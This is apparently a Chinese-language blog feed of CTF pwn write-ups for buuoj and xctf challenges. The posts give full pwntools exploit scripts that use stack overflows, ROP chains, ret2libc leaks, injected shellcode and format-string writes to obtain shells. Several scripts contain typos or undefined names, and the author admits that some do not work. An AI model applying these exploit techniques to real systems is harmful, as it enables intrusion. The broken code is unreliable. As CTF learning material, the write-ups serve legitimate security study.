        <content type="html"><![CDATA[<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><img src="/2022/01/20/ciscn-2019-en-2/checksec.png" alt="image-20220120121659630" style="zoom:80%;"><h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><img src="/2022/01/20/ciscn-2019-en-2/run.png" alt="image-20220120122621055" style="zoom:67%;"><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><img src="/2022/01/20/ciscn-2019-en-2/main.png" alt="image-20220120122857393" style="zoom:67%;"><p>观察程序及运行可知,当输入选项2时只是打印出一些信息,输入3则退出,只有输入1才会调用encrypt函数.所以第一个输入需要输入1.</p><img src="/2022/01/20/ciscn-2019-en-2/encrypt.png" alt="image-20220120123133704" style="zoom:67%;"><p>进入encrypt函数,很容易发现栈溢出的漏洞,由while循环可推出,x的初始值应该为0,可以发现,当s[x]</p><p>是数字时,和0xC进行异或,当s[x]是大写字母时和0xD进行异或,当s[x]是小写字母时,和0xE进行异或.所以我们发送payload之前先给它异或一次,这样到程序里就会再异或一次,两次异或后结果则不变.</p><p>首先编写一个异或函数</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">def decrypt(payload):    l = list(payload)    for i in lrange(len(l)):        if l[i].isdigit():            l[i] = chr(ord(l[i])^0xC)        if l[i].isUpper():            l[i] = chr(ord(l[i])^0xD)        if l[i].islower():            l[i] = chr(ord(l[i])^0xE)    return ''.join(l)        <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为gets只有一个参数,所以我们需要找一个rdi的gadget</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ROPgadget --binary ciscn_en --only "pop|ret" | grep "rdi"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到gadget的地址</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">0x0000000000400c83 : pop rdi ; ret<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由于直接发送payload时会导致栈不对齐,所以我们再搜索一个ret就可以了</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ROPgadget --binary ciscn_en --only "pop|ret" | grep "ret"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">0x00000000004006b9 : ret<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os = 'linux',arch = 'i386',log_level = 'debug')elf = ELF("./ciscn_en")local = 0if local:    r = process("./ciscn_en")else:    r = remote("node4.buuoj.cn",28118)def decrypt(payload):    l = list(payload)    for i in lrange(len(l)):        if l[i].isdigit():            l[i] = chr(ord(l[i])^0xC)        if l[i].isUpper():            l[i] = chr(ord(l[i])^0xD)        if l[i].islower():            l[i] = chr(ord(l[i])^0xE)    return ''.join(l)pop_rdi = 0x0000000000400c83pop_ret = 0x00000000004006b9main_addr = 0x0000000000400B28put_plt = elf.plt['puts']put_got = elf.got['puts']r.recv()r.sendline("1")payload = b'a'*(0x50+0x8) + p64(pop_rdi) + p64(put_got)+p64(put_plt)+p64(main_addr)#payload = decrypt(payload)r.recvuntil("encrypted\n")r.sendline(payload)r.recvuntil("Ciphertext\n")r.recvuntil("\n") #接收puts函数的两个输出puts_addr = u64(r.recvuntil('\n')[:-1].ljust(8,'\0'))log.success("puts_addr="+hex(puts_addr))system_offset = 0x04f440puts_offset = 0x0809c0str_bin_sh_offset = 0x1b3e9alibc_base = puts_addr - puts_offsetsystem_addr = system_offset + libc_basestr_bin_sh = str_bin_sh_offset + libc_baser.sendlineafter("choice!","1")payload1 = b'a'*(0x50+0x8)+p64(pop_ret)+p64(pop_rdi)+p64(str_bin_sh)+p64(system_addr)r.sendline(payload1)r.interactive()    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bjdctf_2020_babystack</title>
      <link href="/2022/01/19/babystack/"/>
      <url>/2022/01/19/babystack/</url>
      
        <content type="html"><![CDATA[<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><img src="/2022/01/19/babystack/checksec.png" alt="image-20220119105523220" style="zoom:80%;"><h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><img src="/2022/01/19/babystack/run.png" alt="image-20220119105645110" style="zoom:80%;"><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><img src="/2022/01/19/babystack/main.png" alt="image-20220119105846641" style="zoom:80%;"><img src="/2022/01/19/babystack/backdoor.png" alt="image-20220119110120523" style="zoom:80%;"><p>这道题真的算是非常简单了,程序中直接就给了后门函数,而且保护几乎都没开,只是一个简单的栈溢出.</p><p>从main函数中可以很明显的看到栈溢出,buf距离rbp0x10个字节,且存在后门函数.所以直接栈溢出跳转到后门函数,便可以直接getshell,拿到flag</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os='linux',arch='amd64',log_level='debug')local = 0if local:    r = process("./babystack")else:    r = remote("node4.buuoj.cn",29244)elf = ELF("./babystack")backdoor = 0x00000000004006E6r.recvuntil("length of your name:")r.sendlline("100")r.recvuntil("What's u name?")payload = b'a'*(0x10+8)+p64(backdoor)r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAW Quals CTF 2017-pilot/pilot</title>
      <link href="/2022/01/18/pilot/"/>
      <url>/2022/01/18/pilot/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本博客仅仅用于对月刊第六期Linux pwn基础入门的学习,跟着分析一遍程序练练手</p></blockquote><blockquote><p>内存页RWX三种属性,如果某一页内存没有可写(W)属性,就无法向里面写入代码,如果没有可执行(X)属性,写入到内存页中的shellcode就无法展开.</p></blockquote><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><img src="/2022/01/18/pilot/checksec.png" alt="image-20220118195915430" style="zoom:80%;"><p>发现程序存在RWX段.只有在某个内存页具有可读可执行属性时,上面的数据才能被当作汇编指令执行,否则将出错.</p><h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><img src="/2022/01/18/pilot/run.png" alt="image-20220118200805651" style="zoom:80%;"><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><img src="/2022/01/18/pilot/main.png" alt="image-20220118201129224" style="zoom: 67%;"><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">#!/usr/bin/python#coding:utf-8from pwn import *context.update(arch = 'amd64',os = 'linux',timeout = 1)context.log_level = 'debug'local = 1if local:    r = process("./pilot")else:    r = remote()elf = ELF("./pilot")#shellcode = #"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\#x89\xe7\x5\x57\x48\x89\xe6\xb0\x3b\x0f\x05"原始的shellcode.由于shellcode位于栈上,运行到push rdi时栈顶正好到了\x89\xe6\xb0\x3b\x0f\x05处,rdi的值会覆盖掉这部分shellcode,从而导致执行失败,所以需要对其拆分shellcode1 = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50"#第一部分shellcode,长度较短,避免尾部被push rdishellocode1 += "\xeb\x18"#使用一个跳转跳过被push rdi 污染的数据,接上第二个部分shellcode继续执行#jmp short $+18hshellcode2 =  "\x57\x48\x89\xe6\xb0\x3b\x0f\x05"#第二部分shellcode#push rdi#mov rsi,rsp#mov al,0x3b#syscallprint(r.recvuntil("Location:"))  #读取到"Location:",紧接着就是泄露出来的栈地址shellcode_address_at_stack = int(r.recv()[0:14],16) #将泄露出来的栈地址从字符串转换成数字log.info("Leak stack address = %x",shellcode_address_at_stack)payload = ""payload += shellcode #拼接shellcodepayload += b"\x90"*(0x28 - len(shellcode)) #任意字符填充到栈中保存的RIP处,此处选用了空指令NOP,即\x90作为填充字符payload += p64(shellcode_address_at_stack) #拼接shellcode所在的栈地址,劫持RIP到该地址执行shellcoder.send(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈溢出 </tag>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>get_started_3dsctf_2016</title>
      <link href="/2022/01/18/get-started/"/>
      <url>/2022/01/18/get-started/</url>
      
        <content type="html"><![CDATA[<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><img src="/2022/01/18/get-started/checksec.png" alt="image-20220118082619927" style="zoom:80%;"><h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><img src="/2022/01/18/get-started/run.png" alt="image-20220118083033545" style="zoom:80%;"><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><p>发现危险函数</p><img src="/2022/01/18/get-started/main.png" alt="image-20220118082936526" style="zoom:80%;"><p>flag函数</p><img src="/2022/01/18/get-started/flag.png" alt="image-20220118083152617" style="zoom: 67%;"><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>本以为v4距离retn有(0x38+4)个字节,但其实不是,因为这个程序的main函数有些不同,它没有push ebp,mov ebp,esp的操作,所i有v4距离retn就是0x38个字节</p><img src="/2022/01/18/get-started/main2.png" alt="image-20220118085540426" style="zoom: 67%;"><p>看别的程序的main函数(这个程序是64位的,所以是push rbp,mov rbp,rsp)</p><p><img src="/2022/01/18/get-started/main3.png" alt="image-20220118085954422"></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>当a1=814536271且 a2=425138641时,才会打开flag.txt,但是程序并没有调用get_flag函数,所以这两个值无法输入,所以要想办法绕过条件.</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os = 'linux',arch = 'i386',log_level = 'debug')elf = ELF("./get_started")local = 1if local:    r = process("./get_started")else:    r = remote("node4.buuoj.cn",26039)get_addr = 0x080489B8payload = b'a'*(0x38+0x4) + p32(get_flag)r.sendline(payload)r.interactive()#这个exp远程打不通<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下面是参考大佬博客写的</p><p>程序里有mprotect函数</p><img src="/2022/01/18/get-started/mprotect.png" alt="image-20220118104844527" style="zoom:67%;"><p>mprotect函数可以修改程序内存里面的权限</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">int mprotect(const void *start,size_t len,int prot);#start是要修改的起始的内存地址#len是修改的长度#prot修改的权限要想达到内存可执行的目的,我们看一下哪个内存最好修改,使用edb-debuger查看,或$ ./ get_started &amp;$ cat /proc/[you_pid]/maps 查看内存区域可以查看到,内存可读可写的地址为: 0x80EB000 ,所以我们对该内存进行增加一个权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以利用mprotect函数修改bss段的权限,让其有执行权限,再用read写入shellcode,然后跳转到bss段执行来getshell.</p><p>mprotect的参数设置</p><blockquote><p>arg1 第一个参数(被修改的内存地址),设置为0x08eb000</p><p>arg2 第二个参数(被修改的内存的大小),设置为0x1000(通过程序启动时查看该内存块的大小得到)</p><p>arg3 第三个参数(被修改的权限),设置为7(rwx)</p></blockquote><p>栈溢出ret到mprotect函数地址,所以为了完整的回来需要再mprotect地址后压入一个返回地址</p><p>为了后续能使用栈ret,需要构造以下栈的布局,因为mprotect函数使用了3个参数,所以需要找存在3个连续pop的指令,因为正常情况下,函数传参是使用push,所以为了使堆栈还原,函数调用结束时就使用pop来保证堆栈完好.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">ROPgadget --binary get_started --only 'pop|ret'|grep 'pop'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里选择这一个</p><img src="/2022/01/18/get-started/pop3.png" alt="image-20220118113318343" style="zoom:80%;"><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os = 'linux',arch = 'i386',log_level = 'debug')elf = ELF("./get_started")local = 0if local:    r = process("./get_started")else:    r = remote("node4.buuoj.cn",25406)    mprotect_addr = 0x0806EC80mem_addr = 0x080eb000  #arg1men_size = 0x100 # arg2 适当大小便好men_pro = 0x7 #arg3 (rwx)    pop_addr = 0x0804f460read_plt = elf.plt["read"]shellcode = asm(shellcraft.sh())payload = b'a'*0x38payload += p32(mprotect_addr)payload += p32(pop_addr) #执行完mprotect后的返回地址#mprotect的三个参数payload += p32(mem_addr)payload += p32(mem_size)payload += p32(mem_pro)payload += p32(read_plt) #执行完3个pop后返回到readpayload += p32(pop_addr) #read函数也有3个参数,所以再次使用这段gadget#read函数的三个参数payload += p32(0) #fdpayload += p32(mem_addr) # bufpayload += p32(0x100) # countpayload += p32(mem_addr) #执行完read后retr.sendline(payload)r.sendline(shellcode)r.interactive() <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jarvisoj_level2</title>
      <link href="/2022/01/18/level2/"/>
      <url>/2022/01/18/level2/</url>
      
        <content type="html"><![CDATA[<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><img src="/2022/01/18/level2/level2.png" alt="image-20220118075941853" style="zoom:80%;"><h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><img src="/2022/01/18/level2/run.png" alt="image-20220118080205727" style="zoom:80%;"><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><p>调用了system函数</p><img src="/2022/01/18/level2/main.png" alt="image-20220118080709952" style="zoom:80%;"><p>明显的栈溢出</p><img src="/2022/01/18/level2/buf.png" alt="image-20220118080609196" style="zoom:80%;"><p>有bin/sh字符串</p><img src="/2022/01/18/level2/bin_sh.png" alt="image-20220118080533995" style="zoom:80%;"><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>本程序既有system函数,还有bin/sh字符串,所以目标是利用栈溢出将”echo hello word”的地址改为”bin/sh”.</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os = 'linux',arch = 'i386',log_level = 'debug')elf = ELF("./level2")local = 0if local:    r = process("./level2")else:    r = remote("node4.buuoj.cn",27490)str_bin_sh = 0x0804A024system_addr = 0x0804849Epayload = b'A'*(0x88+0x4) +p32(system_addr)+p32(str_bin_sh)r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>babyrop</title>
      <link href="/2022/01/17/babyrop/"/>
      <url>/2022/01/17/babyrop/</url>
      
        <content type="html"><![CDATA[<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><img src="/2022/01/17/babyrop/checksec.png" alt="image-20220121104802893" style="zoom:80%;"><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><p>先获取一个随机数</p><img src="/2022/01/17/babyrop/main.png" alt="image-20220117173655281" style="zoom:80%;"><p>然后用strncmp比较用户输入的值和随机数,相同则打印Correct,不相同则直接退出.</p><img src="/2022/01/17/babyrop/sub804871F.png" alt="image-20220117173740939" style="zoom:80%;"><p>所以需要让v1=127(0xff)</p><p>本程序并没有对v5进行改动,但v5却作为返回值,所以应该是v5被溢出改变.</p><img src="/2022/01/17/babyrop/sub_80487D0.png" alt="image-20220117190634017" style="zoom:80%;"><h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>sub_80487D0中能让第二个read栈溢出的前提是传入的a1足够到大,即v5足够大.而要让v5足够大,必须在sub_804871F中必须溢出改变v5的值.若要能成功返回v5,必须使用零截断绕过srncmp函数.</p><p>可以使用ret2libc构造system(“/bin/sh”).</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os='linux',arch='i386',log_level='debug')elf = ELF("./babyrop")local = 0if local:    r = process("./babyrop")else:    r = remote("node4.buuoj.cn",25232)write_plt = elf.symbols["write"]print("write_plt="+hex(write_plt))read_plt = elf.symbols["read"]print("read_plt="+hex(read_plt))read_got = elf.got["read"]print("read_got="+hex(read_got))main_addr = 0x08048825payload1 = '\x00' + '\xff'*0x7r.sendline(payload1)r.recvuntil("Correct\n")def leak(addr):    payload2 = b'a'*(0xe7+0x4)+p32(write_plt)+p32(main_addr)+p32(1)+p32(addr)+p32(8)    r.sendline(payload2)    leak_addr = u32(r.recv(4))    return leak_addr#泄露read函数的地址read_addr = leak(read_got)print("read_addr"+hex(read_addr))read_offset = 0x0ca350libc_base = read_addr - read_offsetprint("libc="+hex(libc_base))system_offset = 0x03f9dcsystem_addr = libc_base + system_offsetbin_sh_offset = 0x11fdd9bin_sh = libc_base + bin_sh_offsetr.sendline(payload1)payload3 = b'a'*(0xe7+0x4)+p32(system_addr)+p32(1)+p32(bin_sh)r.sendline(payload3)r.interactive()#这个exp打不通,我也不知道为什么,我太菜了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个exp用python2才行(ps:this exp 参考半岛铁盒@<a href="https://blog.csdn.net/weixin_45556441/article/details/115194578">大佬博客地址</a>)</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *p = remote("node4.buuoj.cn",25232)libc=ELF('libc-2.23.so')elf = ELF('./babyrop')write_plt = elf.plt['write']write_got = elf.got['write']main = 0x08048825payload1 = "\0" + "\xff"*7p.sendline(payload1)p.recvuntil("Correct\n")payload2 = b"a"*0xe7+b'a'*4 +p32(write_plt) +p32(main)+ p32(1)+p32(write_got)+p32(0x8)p.sendline(payload2)write_addr=u32(p.recv(4))offset = write_addr - libc.sym['write']system_addr=offset+libc.sym['system']bin_sh_addr=offset+libc.search('/bin/sh').next()p.sendline(payload1)p.recvuntil('Correct\n')payload3 = b"a"*0xe7 + b'a'*4 +p32(system_addr) + p32(0) + p32(bin_sh_addr)p.sendline(payload3)p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="解题感想"><a href="#解题感想" class="headerlink" title="解题感想"></a>解题感想</h3><p>我真的是傻乎乎的,题上都给libc了,我还费半天劲去找libc版本</p><p><img src="/2022/01/17/babyrop/libc.png" alt="image-20220117213531760"></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_2019_n_8</title>
      <link href="/2022/01/17/ciscn-2019-n-8/"/>
      <url>/2022/01/17/ciscn-2019-n-8/</url>
      
        <content type="html"><![CDATA[<h3 id="checksec-一看保护全开-本以为很难-没想到…"><a href="#checksec-一看保护全开-本以为很难-没想到…" class="headerlink" title="checksec(一看保护全开,本以为很难,没想到…)"></a>checksec(一看保护全开,本以为很难,没想到…)</h3><img src="/2022/01/17/ciscn-2019-n-8/checksec.png" alt="image-20220117113118808" style="zoom:80%;"><h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><img src="/2022/01/17/ciscn-2019-n-8/run1.png" alt="image-20220117113234511" style="zoom:80%;"><img src="/2022/01/17/ciscn-2019-n-8/run2.png" alt="image-20220117113442418" style="zoom:80%;"><h3 id="ida程序分析"><a href="#ida程序分析" class="headerlink" title="ida程序分析"></a>ida程序分析</h3><ul><li><p>发现函数(并且只需要var的第14个数是0x11就可以执行system了.)</p><p><img src="/2022/01/17/ciscn-2019-n-8/system.png" alt="image-20220117113759246"></p></li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os='linux',arch='i386',log_level='debug')elf = ELF("./ciscn_n_8")local = 0if local:    r = process("./ciscn_n_8")else:    r = remote("node4.buuoj.cn",25490)payload = p32(0x11)*14r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>warmup</title>
      <link href="/2022/01/15/fuzz/"/>
      <url>/2022/01/15/fuzz/</url>
      
        <content type="html"><![CDATA[<p>此题没有附件</p><p>只能nc,发现有一个输入,可以进行fuzz栈溢出</p><h3 id="fuzz函数"><a href="#fuzz函数" class="headerlink" title="fuzz函数"></a>fuzz函数</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">def fuzz(r,num,flag):    payload = b'a'*num    if flag == 1:        payload += p32(addr)    if flag == 2:        payload += p64(addr)    r.recvuntil("&gt;")    r.sendline(payload)        <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-none"><code class="language-none"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf </tag>
            
            <tag> 栈溢出 </tag>
            
            <tag> fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>stack2</title>
      <link href="/2022/01/15/stack2/"/>
      <url>/2022/01/15/stack2/</url>
      
        <content type="html"><![CDATA[<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><img src="/2022/01/15/stack2/checksec.png" alt="image-20220115142055209" style="zoom:80%;"><h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><img src="/2022/01/15/stack2/run.png" alt="image-20220115142227040" style="zoom:80%;"><h3 id="ida-程序分析"><a href="#ida-程序分析" class="headerlink" title="ida+程序分析"></a>ida+程序分析</h3><p>(ps:计算数组首地址距离retn的偏移时异常痛苦)</p><ul><li>此题的关键点也是难点便是找到数组首地址和返回地址之间的偏移.直接从ida看到的偏移并不正确,需要在gdb中手动调试.</li></ul><h3 id=""><a href="#" class="headerlink" title=""></a><img src="/2022/01/15/stack2/array.png" alt="image-20220115212659649" style="zoom:80%;"></h3><ul><li>此处可以看到通过eax和ecx,将v7的数据给v13,此时eax的值便是数组v13的首地址.</li></ul><img src="/2022/01/15/stack2/addr.png" alt="image-20220115212936878" style="zoom:80%;"><ul><li>在retn处下断点,esp处的值便是返回地址.</li></ul><p>​                        <img src="/2022/01/15/stack2/ret.png" alt="image-20220115213107027" style="zoom:80%;"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context.log_level = 'debug'elf = ELF("./stack2")local = 0if local:    r = process("./stack2")else:    r = remote("111.200.241.244",60371)sh_addr = 0x08048987#sh_addr = 0x08048ab3system_plt = 0x08048450offset = 0x84r.sendlineafter("you have:\n","1")r.sendlineafter("numbers\n","1")def sendpayload(addr,i):    r.sendlineafter("exit\n","3")    r.sendlineafter("change:\n",str(addr))    r.sendlineafter("number:\n",str(i))#发送system地址sendpayload(offset,0x50)sendpayload(offset+1,0x84)sendpayload(offset+2,0x04)sendpayload(offset+3,0x08)offset += 8sendpayload(offset,0x87)sendpayload(offset+1,0x89)sendpayload(offset+2,0x04)sendpayload(offset+3,0x08)    r.sendlineafter("exit\n","5")r.interactive()#0x080488F2 ret#0x080486D5 eax#0xffffd18c ret_esp#0xffffd108 eax_array<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf </tag>
            
            <tag> 栈溢出 </tag>
            
            <tag> 数组越界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实时数据检测</title>
      <link href="/2022/01/14/data/"/>
      <url>/2022/01/14/data/</url>
      
        <content type="html"><![CDATA[<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><img src="/2022/01/14/data/checksec.png" alt="image-20220114192523091" style="zoom:80%;"><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><img src="/2022/01/14/data/main.png" alt="image-20220114192624436" style="zoom:80%;"><p>​        只要令key的值为35795746便可以getshell</p><ul><li><p><strong>达到任意地址写的核心在于提供如下格式化字符串: printf(“%s%n”,str,&amp;num)</strong></p></li><li><p>如何修改num的值为很大?</p><p>写入num的值为printf打印出来的所有字符总和,但是如何在内存中构建很大的字符串呢?还要恰好满足长度合适.其实这里可以用格式化控制的输出,printf(“%08x”,num)的含义为十六进制打印,打印时不满8位的补齐8位.</p></li><li><p>如何将num的地址传入</p><p>在调用printf之前,父函数的栈上即为输入的字符串s,调用printf时,是将s的地址作为第一个参数传入,由于printf并不知道自己有几个参数,完全取决于格式化字符串的格式化控制,并且在printf的栈的ebp上即为父函数的栈空间,其中就能找到字符串s,因此可以将num的地址写在s中,在printf(“%吗$n”)的语法中,m为具体数值,表示第几个参数作为num的地址,并写入打印出的字符个数.</p></li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *log_level = 'debug'elf = ELF("./data")local = 0if local:    r = process("./data")else:    r = remote("111.200.241.244",50260)key_addr = 0x0804A048key_value = 0x2223322#payload =flat(["%12$n",p32(key_addr),p32(key_value)])payload = fmtstr_payload(12,{key_addr:key_value})r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p><strong>fmtstr_payload函数</strong></p><p><em>class</em> pwnlib.fmtstr.AtomWrite(<em>start</em>, <em>size</em>, <em>integer</em>, <em>mask=None</em>)[<a href="https://github.com/Gallopsled/pwntools/blob/67b28491a4/pwnlib/fmtstr.py#L161-L279">source]</a></p><p>This class represents a write action that can be carried out by a single format string specifier.</p><p>Each write has an address (start), a size and the integer that should be written.</p><p>Additionally writes can have a mask to specify which bits are important. While the write always overwrites all bytes in the range [start, start+size) the 